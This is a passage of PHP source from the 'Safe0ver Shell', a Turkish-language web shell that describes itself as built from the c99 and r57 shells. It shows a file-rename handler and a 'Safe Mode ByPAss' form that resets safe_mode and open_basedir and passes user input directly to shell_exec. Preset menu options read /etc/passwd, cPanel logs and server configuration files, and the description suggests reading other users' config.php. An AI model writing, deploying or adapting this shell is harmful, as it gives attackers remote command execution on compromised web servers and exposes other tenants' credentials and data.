             echo "$objident renamed successfully:<br><br>Old $objname: \"$oldfile\".<br>New $objname: \"$olddir$newfile\"";
         }
         else {
             if ( @file_exists("$olddir$newfile") ) {
                 echo "Error: The $objident does already exist...<br><br>\"$olddir$newfile\"<br><br>Hit your browser's back to try again...";
             }
             else {
                 echo "Error: Can't copy the file, the file could be in use or you don't have permission to rename it.";
             }
          }
         echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Safe0ver'a Dön\"></form></center>" ;
     }
     else {
         $dpos = strrpos($oldfile, "/");
         if (strval($dpos)!="") {
             $olddir = substr($oldfile, 0, $dpos+1);
           }
         else {
             $olddir = "$lastdir/";
        }
         $fpos = strrpos($oldfile, "/");
         if (strval($fpos)!="") {
             $inputfile = substr($oldfile, $fpos+1);
           }
         else {
             $inputfile = "";
         }
               echo "<center><table><tr><td><form action=\"$SFileName?$urlAdd\" method=\"post\">\n";
         echo "<input type=\"hidden\" name=\"cmd\" value=\"ren\">\n";
         echo "<input type=\"hidden\" name=\"oldfile\" value=\"$oldfile\">\n";
         echo "<input type=\"hidden\" name=\"olddir\" value=\"$olddir\">\n";
         echo "<input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">\n";
         echo "<input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">\n";
         echo "Rename \"$oldfile\" to:<br>\n";
         echo "<input size=\"100\" type=\"text\" name=\"newfile\" value=\"$inputfile\"><br><input type=\"submit\" value=\"Rename\">"; 
        echo "</form><form action=\"$SFileName?$urlAdd\" method=\"post\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input type=\"submit\" value=\"Cancel\"></form>";
         echo "</td></tr></table></center>";
     }
}
else if ( $cmd == "con") {

?>
<center>
<table>
 <tr><td>&nbsp;</td>
 </tr></table>
<?php
}    
else { /* <!-- There is a incorrect or no parameter specified... Let's open the main menu --> */
    $isMainMenu = true;
     ?>
    <table width="100%" border="0" cellpadding="0" cellspacing="0">
     <tr>
      <td width="100%" class="border">
       <center>&nbsp;-<[{ <?php echo $scriptTitle ?> Main Menu }]>-&nbsp;</center>
      </td>
     </tr>
    </table>
    <br>
     <center>
    <table border="0" NOWRAP>
      <tr>
      <td valign="top" class="silver border">
           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>##Safe0ver##</strong></font>", "cmd=dir&dir=.").sp(2); ?>      </td>
       <td style="BORDER-TOP: silver 1px solid;" width=350 NOWRAP><span class="style5"> Safe0ver Shell Piyasada Bulunan Bir Cok Shell'in Kodlarindan(c99,r57 vs...) Sentezlenerek Kodlanmistir.Entegre Olarak Bypass Özelligi Eklenmis Ve Böylece Tahrip Gücü Yükseltilmistir.Yazilimimiz Hic bir Virus,worm,trojan gibi Kullaniciyi Tehdit Eden Veya Sömüren yazilimlar Icermemektedir.<p>--------------------------<p>Bypass Kullaným:<b>Cat /home/evilc0der/public_html/config.php</b> Gibi Olmalidir.<br>
        </span></td>
     </tr>
       </table>
    <br><p><br>Safe Mode ByPAss<p><form method="POST">
	<p align="center"><input type="text" size="40" value="<? if($_POST['dizin'] != "") { echo $_POST['dizin']; } else echo $klasor;?>" name="dizin">
	<input type="submit" value="Çalistir"></p>
</form>
	<form method="POST">
		<p align="center"><select size="1" name="dizin">
                <option value="uname -a;id;pwd;hostname">Sistem Bilgisi</option>
		<option value="cat /etc/passwd">cat /etc/passwd</option>
		<option value="cat /var/cpanel/accounting.log">cat /var/cpanel/accounting.log</option>
		<option value="cat /etc/syslog.conf">cat /etc/syslog.conf</option>
		<option value="cat /etc/hosts">cat /etc/hosts</option>
                <option value="cat /etc/named.conf">cat /etc/named.conf</option>
                <option value="cat /etc/httpd/conf/httpd.conf">cat /etc/httpd/conf/httpd.conf</option>
                <option value="netstat -an | grep -i listen">Açik Portlar</option>
                <option value="ps -aux">Çalisan Uygulamalar</option>
</select> <input type="submit" value="Çalistir"></p>
	</form>
------------------------------------------------------------------------------------<p>
<?
$evilc0der=$_POST['dizin'];
if($_POST['dizin'])
{
ini_restore("safe_mode");
ini_restore("open_basedir");
$safemodgec = shell_exec($evilc0der);
echo "<textarea rows=17 cols=85>$safemodgec</textarea>";
}
?>
</center>
    <br>
     <?php
}

if ($cmd != "downl") {
    if ( $isMainMenu != true) {
         ?>

		<table width="100%" border="0" cellpadding="0" cellspacing="0">
         <tr>
          <td width="100%" style="class="silver border">
           <center><strong>
            &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Main Menu&nbsp;]  </font>", "cmd=&dir=");      ?>&nbsp;&nbsp;
            &nbsp;&nbsp;&nbsp;&nbsp;
                    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;R00T&nbsp;]  </font>", "cmd=dir&dir=.");  ?> &nbsp;&nbsp;
            </strong></center>
          </td>
         </tr>
        </table>
        <br>
        <?php
}
    ?>
    <table width=100% border="0" cellpadding="0" cellspacing="0">
     <tr>
      <td width="100%" class="silver border">
       <center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>
      </td>
     </tr>
    </table>
        </td>
  </tr>
 </table>

  <?php
 }

?>
